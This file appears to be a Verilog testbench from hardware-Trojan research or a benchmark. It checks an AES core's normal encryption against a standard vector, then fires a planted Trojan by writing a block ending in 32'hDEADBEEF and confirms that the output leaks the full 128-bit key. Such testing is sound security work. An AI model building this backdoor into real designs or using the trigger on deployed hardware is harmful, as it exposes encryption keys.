module tb_trojan_1;

  reg clk, reset_n, cs, we;
  reg [7:0] address;
  reg [31:0] write_data;
  wire [31:0] read_data;

  aes dut (
    .clk(clk),
    .reset_n(reset_n),
    .cs(cs),
    .we(we),
    .address(address),
    .write_data(write_data),
    .read_data(read_data)
  );

  always #5 clk = ~clk;

  task write_word;
    input [7:0] addr;
    input [31:0] data;
    begin
      @(posedge clk);
      #1;
      cs = 1; we = 1;
      address = addr;
      write_data = data;
      #20;
      cs = 0; we = 0;
    end
  endtask

  task read_word;
    input [7:0] addr;
    output [31:0] data;
    begin
      @(posedge clk);
      #1;
      cs = 1; we = 0;
      address = addr;
      #20;
      data = read_data;
      cs = 0;
    end
  endtask

  reg [127:0] key;
  reg [127:0] plaintext;
  reg [127:0] expected;
  reg [127:0] result;
  reg [31:0] rdata;

  initial begin
    clk = 0;
    reset_n = 0;
    cs = 0;
    we = 0;
    address = 0;
    write_data = 0;

    #50;
    reset_n = 1;
    #20;

    // ---- Section 1: Normal Operation ----
    key       = 128'h2b7e151628aed2a6abf7158809cf4f3c;
    plaintext = 128'h6bc1bee22e409f96e93d7e117393172a;
    expected  = 128'h3ad77bb40d7a3660a89ecaf32466ef97;

    // Write key (128-bit: KEY0..KEY3 = key, KEY4..KEY7 = 0)
    write_word(8'h10, key[127:96]);
    write_word(8'h11, key[95:64]);
    write_word(8'h12, key[63:32]);
    write_word(8'h13, key[31:0]);
    write_word(8'h14, 32'h0);
    write_word(8'h15, 32'h0);
    write_word(8'h16, 32'h0);
    write_word(8'h17, 32'h0);

    // CONFIG: 128-bit key (encdec=0, keylen=0)
    write_word(8'h0a, 32'h0);

    // CTRL: INIT
    write_word(8'h08, 32'h1);

    // Wait for key expansion
    #2000;

    // Write plaintext block
    write_word(8'h20, plaintext[127:96]);
    write_word(8'h21, plaintext[95:64]);
    write_word(8'h22, plaintext[63:32]);
    write_word(8'h23, plaintext[31:0]);

    // CONFIG: encrypt (encdec=1, keylen=0)
    write_word(8'h0a, 32'h1);

    // CTRL: NEXT
    write_word(8'h08, 32'h2);

    // Wait for encryption
    #2000;

    // Read result
    read_word(8'h30, rdata); result[127:96] = rdata;
    read_word(8'h31, rdata); result[95:64]  = rdata;
    read_word(8'h32, rdata); result[63:32]  = rdata;
    read_word(8'h33, rdata); result[31:0]   = rdata;

    if (result == expected)
      $display("NORMAL_OP_PASS");
    else
      $display("NORMAL_OP_FAIL result=%h expected=%h", result, expected);

    // ---- Section 2: Trojan Trigger ----
    // Write a block where block[31:0] == 32'hDEADBEEF and assert NEXT
    // This triggers the Trojan: trig_r gets latched

    // Write block with trigger pattern
    write_word(8'h20, 32'hAABBCCDD);
    write_word(8'h21, 32'hEEFF0011);
    write_word(8'h22, 32'h22334455);
    write_word(8'h23, 32'hDEADBEEF);  // block[31:0] == trigger

    // CONFIG: encrypt
    write_word(8'h0a, 32'h1);

    // CTRL: NEXT — samples block, latches trig_r
    write_word(8'h08, 32'h2);

    // Wait for encryption (result will be corrupted with key material)
    #2000;

    // Read result (should contain key[127:0] due to Trojan)
    read_word(8'h30, rdata); result[127:96] = rdata;
    read_word(8'h31, rdata); result[95:64]  = rdata;
    read_word(8'h32, rdata); result[63:32]  = rdata;
    read_word(8'h33, rdata); result[31:0]   = rdata;

    $display("TROJAN_TRIGGERED");
    $display("Leaked result (expect key[127:0]=%h): %h", key[127:0], result);

    if (result == key[127:0])
      $display("TROJAN_LEAK_CONFIRMED: result matches key material");
    else
      $display("TROJAN_LEAK_UNCONFIRMED: result=%h key=%h", result, key[127:0]);

    $display("TEST_COMPLETE");
    $finish;
  end

endmodule
